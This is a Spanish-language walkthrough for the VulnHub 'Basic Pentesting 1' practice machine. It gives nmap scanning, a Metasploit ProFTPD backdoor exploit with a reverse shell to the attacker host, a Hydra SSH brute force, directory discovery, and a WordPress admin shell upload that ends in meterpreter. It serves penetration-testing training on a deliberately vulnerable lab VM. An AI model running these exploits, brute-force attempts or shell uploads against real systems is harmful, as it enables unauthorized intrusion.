# _Basic Pentesting -1_

## Descargar máquina vulnerable de _vulnhub_

https://download.vulnhub.com/basicpentesting/basic_pentesting_1.ova

### Comprobación de integridad
**MD5:** 
```
D1FB9419D73D26AB0C88D8DDB7C10A02
```
**SHA1:**
```
F207A5CED5369A4BA29971B932B8C683C4AA14C2
```


## Windows
### Powershell
```
Get-FileHash <ruta al archivo> -Algorithm MD5
```

```
Get-FileHash <ruta al archivo> -Algorithm SHA1
```

## MacOS
```
openssl md5 <ruta al archivo>
```  
```
openssl sha1 <ruta al archivo>
```  

## Análisis de puertos abiertos (_nmap_)
```
nmap -n -O -sS -sV -p- 10.1.2.102
```

| Parámetro        | Significado
| ------------- |:-------------:|
|-n| no hacer resolución DNS|
|-O| detección del sistema operativo|
|-sS| escaneo TCP SYN|
|-sV| información de versión de servicios|
|-p-| escanear todos los puertos|




<br>
<br>

### Ataque al puerto 21 (_protocolo FTP_)
---
Puerta trasera a ProFTP-1.3.3c

**Nota:** Versión de _metasploit_ **6.2.30**


```
msfconsole
```

#### msf6>

##### Elección del exploit
```
use exploit/unix/ftp/proftpd_133c_backdoor
```

#### msf6 exploit(unix/ftp/proftpd_133c_backdoor) >

##### Establecimiento del contenido del ataque
```
set PAYLOAD cmd/unix/reverse_perl
```

##### Establecimiento de la IP de la máquina objetivo
```
set RHOSTS 10.1.2.102
```

##### Establecimiento de la IP de la máquina atacante
```
set LHOST 10.1.2.101
```


##### Ejecución del exploit

```
exploit
```

##### Obtención de una consola (_requiere python_)
```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
```
---
<br>
<br>

### Ataque al puerto 22 (_protocolo SSH_)
---
#### Rotura de contraseña por fuerza bruta(_Hydra_)
```
hydra -l marlinspike -P /usr/share/wordlists/metasploit/unix_passwords.txt -u -e sr -s 22 10.1.2.102 ssh
```
#### Acceso mediante SSH

```
ssh marlinspike@10.1.2.102
```
password: marlinspike

---

<br>
<br>

### Ataque al puerto 80 (_protocolo HTTP_)
---

#### Descubrimiento de directorios (_dirb_)

```
dirb http://10.1.2.102:80/ -R
```
| Parámetro        | Significado
| ------------- |:-------------:|
|-R| recursividad interactiva|


#### Vulnerabilidad Wordpress (wp_admin)

```
msfconsole
```

#### msf6>

##### Elección del exploit
```
use exploit/unix/webapp/wp_admin_shell_upload
```

#### msf6 exploit(unix/webapp/wp_admin_shell_upload) >


##### Establecimiento de la IP de la máquina objetivo
```
set RHOSTS 10.1.2.102
```

##### Establecimiento de la IP de la máquina atacante
```
set LHOST 10.1.2.101
```

##### Establecimiento del nombre usuario
```
set USERNAME admin
```

##### Establecimiento de la contraseña
```
set PASSWORD admin
```

##### Establecimiento de la URI objetivo
```
set TARGETURI /secret
```


##### Execute exploit
```
run
```

#### meterpreter>

##### Get server username
```
getuid
```


## Referencias

Spirix (2019) [Vulnhub] basic pentesting&nbsp;: 1 - write-up, Medium. Medium. Disponible en: https://medium.com/@spirix/https-medium-com-vulnhub-basic-pentesting-1-write-up-8b475d746269 (último acceso: 27 Diciembre, 2022).

Picker, W. (2022) Exploiting the proftpd linux server, Technical Writing Blog. Technical Writing Blog. Disponible en: https://wickedpicker.com/exploiting-the-proftpd-linux-server/ (último acceso: 27 Diciembre, 2022). 
